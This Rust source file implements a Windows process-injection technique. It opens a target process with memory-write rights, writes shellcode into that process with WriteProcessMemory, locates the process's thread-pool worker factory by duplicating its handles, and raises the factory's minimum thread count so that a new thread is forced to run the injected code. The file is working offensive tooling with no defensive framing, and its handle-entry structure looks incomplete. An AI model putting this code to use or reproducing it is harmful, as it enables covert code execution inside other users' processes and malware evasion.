#![allow(non_upper_case_globals)]
#![allow(non_camel_case_types)]

use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::SIZE_T, 
        ntdef::{HANDLE,NTSTATUS, NT_SUCCESS, PVOID}, 
        ntstatus::{STATUS_ACCESS_DENIED, STATUS_NOT_FOUND}
    },
    um::{
        handleapi::{CloseHandle, DuplicateHandle},
        memoryapi::{WriteProcessMemory},
        processthreadsapi::{GetCurrentProcess, OpenProcess},
        winnt::{
            DUPLICATE_SAME_ACCESS,
            PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION, 
            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, 
        },
    },
};

use ntapi::{
    ntexapi::{
        NtQueryInformationWorkerFactory,
        NtSetInformationWorkerFactory,
        WorkerFactoryBasicInformation,
        WORKER_FACTORY_BASIC_INFORMATION,
        WorkerFactoryThreadMinimum,
    },
    ntobapi::{
        NtQueryObject,
        ObjectTypeInformation,
        OBJECT_TYPE_INFORMATION,
    },
    ntpsapi::{
        NtQueryInformationProcess,
        ProcessHandleInformation,
    },
};

// Handle Entry structures
#[repr(C)]
pub struct HandleEntry {
    pub handle_value: HANDLE,
    pub granted_access: u32,
}

#[repr(C)]
pub struct ProcessHandleInfo {
    pub number_of_handles: usize,
    pub handles: [HandleEntry; 1], // This is actually a flexible array
}

// Public utility functions
pub(crate) fn get_target_process_handle(pid: u32) -> HANDLE {
    unsafe { 
        OpenProcess(
            PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | 
            PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, 
            0, 
            pid
        ) 
    }
}

pub(crate) fn write_shellcode_to_memory(process_handle: HANDLE, address: *mut c_void, shellcode: &[u8]) -> NTSTATUS {
    let write_result = unsafe { 
        WriteProcessMemory(
            process_handle,
            address,
            shellcode.as_ptr() as *const c_void,
            shellcode.len() as SIZE_T,
            std::ptr::null_mut()
        ) 
    };

    if write_result == 0 {
        return STATUS_ACCESS_DENIED;
    }

    0 // Return success status (0)
}

pub(crate) fn find_worker_factory_handle(process_handle: HANDLE) -> Result<HANDLE, NTSTATUS> {
    let mut _buffer_size: usize = 1024 * 1024; // 1MB initial buffer
    let mut handle_info: Vec<u8> = vec![0u8; _buffer_size];
    let mut return_length: u32 = 0;
    
    // Query process handle information
    unsafe {
        let status = NtQueryInformationProcess(
            process_handle,
            ProcessHandleInformation,
            handle_info.as_mut_ptr() as _,
            handle_info.capacity() as u32,
            &mut return_length,
        );
        
        if !NT_SUCCESS(status) {
            return Err(status);
        }

    }

    let handle_snapshot = handle_info.as_ptr() as *const ProcessHandleInfo;
    let handles = unsafe { 
        std::slice::from_raw_parts(
            &(*handle_snapshot).handles as *const HandleEntry,
            (*handle_snapshot).number_of_handles
        ) 
    };

    let mut found_handle_types = std::collections::HashSet::new();
    let mut worker_factory_handles = Vec::new();

    for (_, handle_entry) in handles.iter().enumerate() {
        let mut duplicated_handle: HANDLE = std::ptr::null_mut();

        // Try to duplicate the handle
        let dup_result = unsafe {
            DuplicateHandle(
                process_handle,
                handle_entry.handle_value,
                GetCurrentProcess(),
                &mut duplicated_handle,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            )
        };
        
        if dup_result == 0 {
            continue;
        }

        // Get size needed for object info
        let mut type_info_len = 0;
        let _ = unsafe { 
            NtQueryObject(
                duplicated_handle,
                ObjectTypeInformation,
                std::ptr::null_mut(),
                0,
                &mut type_info_len
            ) 
        };

        // Get actual object info
        let mut type_info = vec![0u8; type_info_len as usize];
        let status = unsafe { 
            NtQueryObject(
                duplicated_handle,
                ObjectTypeInformation,
                type_info.as_mut_ptr() as PVOID,
                type_info_len,
                std::ptr::null_mut()
            ) 
        };

        if NT_SUCCESS(status) {
            let type_info = type_info.as_ptr() as *const OBJECT_TYPE_INFORMATION;
            let type_name = unsafe { 
                std::slice::from_raw_parts(
                    (*type_info).TypeName.Buffer as *const u16,
                    (*type_info).TypeName.Length as usize / 2
                ) 
            };

            if let Ok(name) = String::from_utf16(type_name) {
                found_handle_types.insert(name.clone());
                
                if name == "TpWorkerFactory" {
                    worker_factory_handles.push(duplicated_handle);
                }
            }
        } else {
            unsafe { CloseHandle(duplicated_handle) };
        }
    }
    
    if worker_factory_handles.is_empty() {
        return Err(STATUS_NOT_FOUND);
    }

    // Return the first worker factory handle found
    Ok(worker_factory_handles[0])
}

pub(crate) fn get_worker_factory_basic_info(worker_factory_handle: HANDLE) -> Result<WORKER_FACTORY_BASIC_INFORMATION, NTSTATUS> {
    let mut basic_info: WORKER_FACTORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };

    let status = unsafe { 
        NtQueryInformationWorkerFactory(
            worker_factory_handle,
            WorkerFactoryBasicInformation,
            &mut basic_info as *mut _ as *mut c_void,
            std::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
            std::ptr::null_mut()
        ) 
    };

    if !NT_SUCCESS(status) {
        return Err(status);
    }

    Ok(basic_info)
}

pub(crate) fn setup_execution(worker_factory_handle: HANDLE, basic_info: &WORKER_FACTORY_BASIC_INFORMATION) -> NTSTATUS {
    // Set minimum thread count to current + 1 to force creation of new thread
    let min_thread_count: u32 = basic_info.TotalWorkerCount + 1;
    
    unsafe {
        NtSetInformationWorkerFactory(
            worker_factory_handle,
            WorkerFactoryThreadMinimum,
            &min_thread_count as *const _ as *mut c_void,
            std::mem::size_of::<u32>() as u32
        )
    }
}